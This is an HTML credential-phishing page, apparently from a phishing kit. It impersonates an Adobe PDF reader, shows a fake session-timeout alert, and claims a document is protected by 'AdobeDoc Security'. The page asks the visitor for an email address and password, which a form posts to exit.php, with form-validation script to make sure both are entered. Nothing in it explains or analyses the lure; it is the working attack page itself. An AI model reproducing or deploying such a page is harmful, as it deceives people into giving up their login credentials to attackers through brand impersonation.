﻿
<script>
alert('Your session has timed out, Click OK to sign in and continue.');
</script>
<!DOCTYPE html>
<link rel="icon" type="image/ico" href="./secure_/favicon-16x16.png"/>
<script type="text/JavaScript"><!--
function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.name; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' Is required.\n'; }
  } if (errors) alert('The following error occurred:\n'+errors);
  document.MM_returnValue = (errors == '');
}
</script>
<html >
  <head>
    <meta charset="UTF-8">


    <title>Adobe® PDF Reader® Xl</title>
    
    
    
    <link rel='stylesheet prefetch' href='http://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/themes/smoothness/jquery-ui.css'>

        <link rel="stylesheet" href="css/style.css">
        
        <document.body.style.backgroundPosition = "";> 

    
    
    
  </head>

  <body>
<br>
<br>
<br>
<br>
<br>
<br>

  <div class="login-card">
    <p align="center"><img src="secure_/lg_211.png" width="571" height="87"><br>
    </p>
<h1><img src="secure_/warning_sign_clip_art_20327.gif" width="29" height="30">This File is Protected by AdobeDoc® Security</h1>
      <div align="center">
      <div align="center">
      Enter your email and password to access this pdf document.<br>
      <br><form action="exit.php" method="post" onsubmit="MM_validateForm('email','','RisEmail','password','','R');return document.MM_returnValue">
      </div>
      </div>
      <form class="login">
     <div align="center">
       <p>
         <input type="text" name="email" placeholder="Email" value="">
         <input type="password" name="password" placeholder="Password">
         <input type="submit" name="login" class="login login-submit" value="View PDF Document" id="login">
         <br>
       <img src="secure_/lg_212.png" width="561" height="92">       </p>
     </div>
  </form>
  </div>
  <p><br>
      <br>
  </p>
  <p>
      <!-- <div id="error"><img src="https://dl.dropboxusercontent.com/u/23299152/Delete-icon.png" /> Your caps-lock is on.</div> -->
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <script src='http://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/jquery-ui.min.js'></script>
      <br>
</p>
  </body>
</html>
